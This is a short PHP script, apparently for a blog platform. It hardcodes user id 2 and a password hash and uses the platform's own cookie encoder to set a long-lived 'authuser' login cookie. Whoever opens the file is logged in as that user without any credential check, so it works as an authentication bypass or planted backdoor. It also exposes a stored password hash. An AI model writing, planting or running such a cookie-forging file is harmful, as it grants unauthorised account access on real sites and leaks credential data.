<?php 

define('BLOG_ROOT', dirname(__FILE__));

require './source/jam_core.php';

$cookietime=2952000;
$user['uid']=2;
$user['password']='3430916bfea10b8851f24cae695aa54c';
bsetcookie('authuser', authcode("{$user['password']}\t{$user['uid']}", 'ENCODE'), $cookietime);

?>